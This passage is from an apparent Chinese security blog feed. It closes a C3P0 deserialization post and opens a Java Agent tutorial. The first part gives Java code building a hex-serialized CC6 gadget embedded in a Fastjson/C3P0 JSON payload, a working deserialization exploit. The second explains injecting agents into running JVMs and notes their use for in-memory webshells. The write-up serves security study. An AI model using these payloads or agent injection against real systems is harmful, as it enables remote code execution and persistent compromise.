class="hljs-variable">ub</span> <span class="hljs-operator">=</span> b &amp; <span class="hljs-number">0xff</span>; <span class="hljs-comment">//转成无符号整数</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> ub / <span class="hljs-number">16</span>;  <span class="hljs-comment">//计算高位十六进制数字</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> ub % <span class="hljs-number">16</span>;  <span class="hljs-comment">//计算地位十六进制数字</span><br>        sw.write(toHexDigit(h1)); <span class="hljs-comment">//转换成字符然后写入</span><br>        sw.write(toHexDigit(h2));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">toHexDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> h)</span><br>    &#123;<br>        <span class="hljs-comment">//逐个字符进行转换</span><br>        <span class="hljs-type">char</span> out;<br>        <span class="hljs-keyword">if</span> (h &lt;= <span class="hljs-number">9</span>) out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-keyword">else</span> out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x37</span>);<br>        <span class="hljs-comment">//System.err.println(h + &quot;: &quot; + out);</span><br>        <span class="hljs-keyword">return</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">//将类序列化为字节数组</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] tobyteArray(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao);<br>        oos.writeObject(o);<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">//字节数组转十六进制</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> bytes.length;<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>(len * <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; ++i)<br>            addHexAscii(bytes[i], sw);<br>        <span class="hljs-keyword">return</span> sw.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> toHexAscii(tobyteArray(CC6()));<span class="hljs-comment">//获取十六进制字符串</span><br>        System.out.println(hex);<br><br>        <span class="hljs-comment">//Fastjson&lt;1.2.47</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="hljs-string">&quot;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241103225728831.png" alt="image-20241103225728831"></p><p>低版本fastjson也可以直接用简单一点的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;&quot; +<br>        &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +<br>        &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +<br>        &quot;&#125;&quot;;<br></code></pre></td></tr></table></figure><p><strong>特殊的地方</strong></p><p>但根据上面的利用流程来看，如果配合fastjson的链子，这里我们的WrapperConnectionPoolDataSource类至少需要调用两次构造方法，第一个次是调用我们的setter方法，第二次是调用构造方法触发链子</p><p>关键的地方就在他的setUserOverridesAsString方法里面，我们去看一下</p><p><img src="https://cdn.clown2024.cn/image-20241103235801196.png" alt="image-20241103235801196"></p><p>当我们调用该setter时，首先会与旧的<code>userOverridesAsString</code>属性比较，这里旧值为<code>null</code>，新值为我们构造的<code>userOverridesAsString</code>，因此这里会进入if判断。</p><p>一路跟进方法，最终到<code>WrapperConnectionPoolDataSource#vetoableChange</code>方法</p><p><img src="https://cdn.clown2024.cn/image-20241104000506391.png" alt="image-20241104000506391"></p><p>这里propName就是userOverridesAsString，我们会走到这个判断里面，然后直接调用C3P0ImplUtils#parseUserOverridesAsString方法对我们传入的十六进制字符串进行解析，就减少了一次需要调用构造函数的操作</p><h1 id="c3p0不出网利用"><a href="#C3P0不出网利用" class="headerlink" title="C3P0不出网利用"></a>C3P0不出网利用</h1><p>C3P0不出网的利用条件较为苛刻，而且需要存在Tomcat8的依赖环境</p><p>跟jndi高版本绕过类似，但是jndi高版本绕过还没学，体会不到，所以先空一下到时再补🫡</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;c3p0介绍&quot;&gt;&lt;a href=&quot;#C3P0介绍&quot; class=&quot;headerlink&quot; title=&quot;C3P0介绍&quot;&gt;&lt;/a&gt;C3P0介绍&lt;/h1&gt;&lt;p&gt;C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java Agent学习</title>
    <link href="https://clowsman.github.io/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-30T12:41:16.000Z</published>
    <updated>2024-11-13T03:04:14.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java-agent介绍"><a href="#Java-Agent介绍" class="headerlink" title="Java Agent介绍"></a>Java Agent介绍</h1><p>官方文档：<a href="https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html">https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html</a></p><p>java agent就是一种能够在不影响正常编译的情况下，修改java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。也就是平时所说的插桩技术，平常的热部署、诊断工具都是基于Java Agent技术来实现的。该技术从JDK1.5开始引入。</p><h1 id="java-agent使用"><a href="#Java-Agent使用" class="headerlink" title="Java Agent使用"></a>Java Agent使用</h1><p>Java Agent分为两种，一种是在JVM启动前加载的premain-Agent，另一种是JVM启动后加载的agentmain-Agent，有点类似特殊的拦截器的样子。</p><h2 id="premain-agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h2><p>实现该Agent首先我们必须实现一个静态premain方法，同时我们jar文件的清单(mainfest)中必须要有Premain-Class属性，也就是jar包中常见到的MF文件，这从官方文档中可以得知</p><p><img src="https://cdn.clown2024.cn/image-20241030211341318.png" alt="image-20241030211341318"></p><p>可以知道，就是在执行main方法前执行我们的premain方法，执行的类就是我们Premain-Class属性的值</p><p>现在来实现一个简单的premain-Agent，先正常maven创建一个普通的项目</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">premainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            System.out.printf(<span class="hljs-string">&quot;调用了JavaAgent%d次\n&quot;</span>,i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着在 <code>resources/META-INF/</code> 下创建 <code>MANIFEST.MF</code> 清单文件用以指定 <code>premain-Agent</code> 的启动类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Premain-Class: org.example.Agent.premainAgent<br><br></code></pre></td></tr></table></figure><blockquote><p>要注意该文件最后一定要多一个换行，不然会爆红</p></blockquote><p>目前的目录结构如下：</p><p><img src="https://cdn.clown2024.cn/image-20241030213350306.png" alt="image-20241030213350306"></p><p>然后我们将该文件打成jar包，这里记录两种打包方式</p><p><strong>用jar命令打包</strong></p><p>打包前我们需要将java文件替换成我们编译好的class文件，因为jar命令就只是将文件打包成一个jar，并不会进行编译，而jar包的文件想要被JVM识别就需要是class文件</p><p>然后对src目录的所有文件打包</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">CTF</span>\<span class="hljs-title">Java</span>\<span class="hljs-title">JavaCode</span>\<span class="hljs-title">JavaAgent</span>\<span class="hljs-title">src</span>\<span class="hljs-title">main</span>&gt;<span class="hljs-title">jar</span> <span class="hljs-title">cvfm</span> ..\..\<span class="hljs-title">agent.jar</span> <span class="hljs-title">resources</span>/<span class="hljs-title">META</span>-<span class="hljs-title">INF</span>/<span class="hljs-title">MANIFEST.MF</span> ..\..\<span class="hljs-title">src</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220310229.png" alt="image-20241030220310229"></p><p><img src="https://cdn.clown2024.cn/image-20241030220348113.png" alt="image-20241030220348113"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">参数说明：<br>c：创建新的 JAR 文件。<br>v：生成详细输出，以便查看正在执行的操作。<br>f：指定 JAR 文件的名称。<br>m：指定 MANIFEST.MF 文件的位置。<br></code></pre></td></tr></table></figure><p>然后就能看到我们的agent.jar包了，我看文章也可以直接指定单一class文件打成jar包，例如这样</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">jar cvfm ..\..\agent1.jar resources/META-INF/MANIFEST.MF java\org\example\Agent\<br>premainAgent.class<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220652347.png" alt="image-20241030220652347"></p><p>这种打包方式会自动给你创建必要的包路径，对比了一下两种打包方式，目录结构如下</p><p><img src="https://cdn.clown2024.cn/image-20241030220817921.png" alt="image-20241030220817921"></p><p>指定class文件打包的就是直接从java包开始创建，只创建寻找类的必要的包</p><p><img src="https://cdn.clown2024.cn/image-20241030220900229.png" alt="image-20241030220900229"></p><p>而指定目录的方式就会从我们指定的目录开始打包，都会包括进去</p><p>顺便也记录一下有关jar会用的上的其他命令：</p><ul><li><p>检查jar文件内容：jar tvf agent.jar</p><p><img src="https://cdn.clown2024.cn/image-20241030221232096.png" alt="image-20241030221232096"></p></li></ul><p><strong>使用idea打包</strong></p><p>这种方式不需要提前编译，他在build的时候就会帮我们编译</p><p>我们选择选择<code>Project Structure</code> -&gt; <code>Artifacts</code> -&gt; <code>JAR</code> -&gt; <code>From modules with dependencies</code></p><p><img src="https://cdn.clown2024.cn/image-20241030221418303.png" alt="image-20241030221418303"></p><p><img src="https://cdn.clown2024.cn/image-20241030221442499.png" alt="image-20241030221442499"></p><p><img src="https://cdn.clown2024.cn/image-20241030221521466.png" alt="image-20241030221521466"></p><p>然后选择选择<code>Build</code> -&gt; <code>Build Artifacts</code> -&gt; <code>Build</code></p><p>然后就可以在out目录看到我们生成的jar包了</p><p><img src="https://cdn.clown2024.cn/image-20241030221714027.png" alt="image-20241030221714027"></p><p>现在我们的agent类已经创建好了，我们需要再创建一个新的目标类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样使用MF来打包，创建一个MF文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Main-Class: org.example.Main<br><br></code></pre></td></tr></table></figure><p>然后打成jar包</p><p>现在我们就得到两个jar包</p><p><img src="https://cdn.clown2024.cn/image-20241030222419726.png" alt="image-20241030222419726"></p><p>然后我们只要添加一个参数就能应用agent.jar包，格式在官方文档也有，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-javaagent:&lt;jarpath&gt;[=&lt;options&gt;]<br># options是传递给代理的参数，premain的agentArgs字段就是用来接受参数的<br></code></pre></td></tr></table></figure><p>现在执行下面命令运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -javaagent:agent.jar -jar TestAgent.jar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030223732827.png" alt="image-20241030223732827"></p><h2 id="agentmain-agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h2><p>agentmain-Agent就是能够在JVM启动后加载并修改字节码</p><p>编写该类需要实现agentmain方法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样写一个MF文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br><br></code></pre></td></tr></table></figure><p>然后写一个一直运行的目标类方便观察结果</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是agentmain就不是通过命令行指定参数的形式启动了，官方为了实现启动后加载，提供了<code>Attach API</code>。Attach API 很简单，只有 2 个主要的类，都在 <code>com.sun.tools.attach</code>包里面。</p><p>这两个类为<code>com.sun.tools.attach.VirtualMachine</code>类和<code>com.sun.tools.attach.VirtualMachineDescriptor</code>类</p><blockquote><p>这两个类在tools.jar包中，可能要手动添加一下jar包，因为我在jdk8u65测试的时候他没有自动引入</p><p><img src="https://cdn.clown2024.cn/image-20241030232514951.png" alt="image-20241030232514951"></p></blockquote><h3 id="virtualmachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h3><p>该类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>我们可以通过给该类的attach方法传入一个JVM的PID，然后远程连接到该JVM上，之后就可以对该JVM及进行操作，比如注入agent就是以这种形式</p><p>下面是该类的主要方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//允许我们传入一个JVM的PID，然后远程连接到该JVM上<br>VirtualMachine.attach()<br> <br>//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理<br>VirtualMachine.loadAgent()<br> <br>//获得当前所有的JVM列表<br>VirtualMachine.list()<br> <br>//解除与特定JVM的连接<br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure><p>使用其中一个方法试试</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030234554068.png" alt="image-20241030234554068"></p><h3 id="virtualmachinedescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h3><p>该类就是一个描述特定虚拟机的类，从前面list方法获取的返回值也能知道，他就代表一个虚拟机，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。</p><p>我们可以测试一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>            System.out.println(virtualMachineDescriptor.displayName());<br>            System.out.println(virtualMachineDescriptor.id());<span class="hljs-comment">//打印PID</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030235436825.png" alt="image-20241030235436825"></p><h3 id="注入agent"><a href="#注入agent" class="headerlink" title="注入agent"></a>注入agent</h3><p>现在知道了这两个类我们就可以进行注入了</p><p>同样的我们前面的agent要打成jar包，然后我们还要写一个inject类用于注入</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后先将目标类运行起来，一段时间后开启我们的inject类</p><p><img src="https://cdn.clown2024.cn/image-20241031000148056.png" alt="image-20241031000148056"></p><p>可以看到成功注入目标类中</p><h1 id="instrumentation实例"><a href="#Instrumentation实例" class="headerlink" title="Instrumentation实例"></a>Instrumentation实例</h1><h2 id="instrumentation介绍"><a href="#Instrumentation介绍" class="headerlink" title="Instrumentation介绍"></a>Instrumentation介绍</h2><p>在实现agent的方法的时候，我们发现除了参数的接受，他还有另一个Instrumentation类型的参数，该类在java.lang.instrument包下，那么什么是Instrumentation呢</p><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p>Instrumentation是一个接口，其常用方法如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//删除一个类转换器</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类，相当于重新加载使我们的修改生效</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br> <br>    <span class="hljs-comment">//判断一个类是否能被修改</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// 获取目标所有已经加载的类。</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//获取一个对象的大小</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br> <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="instrumentation使用"><a href="#Instrumentation使用" class="headerlink" title="Instrumentation使用"></a>Instrumentation使用</h2><p>我们修改一下前面的agentMain来试一试Instrumentation的功能，我们给目标类添加一个ClassFileTransformer类转换器</p><p>ClassFileTransformer接口下只有一个transform方法，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 java agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与 addTransformer 搭配使用。</p><p>目标类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            Hello();<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是改一下我们的agentMain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//获取所有已加载的类</span><br>        <span class="hljs-comment">//获取目标JVM加载的全部类</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>))&#123;<br><br>                <span class="hljs-comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是我们的ClassFileTransformer，这里用javassist来修改类</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span 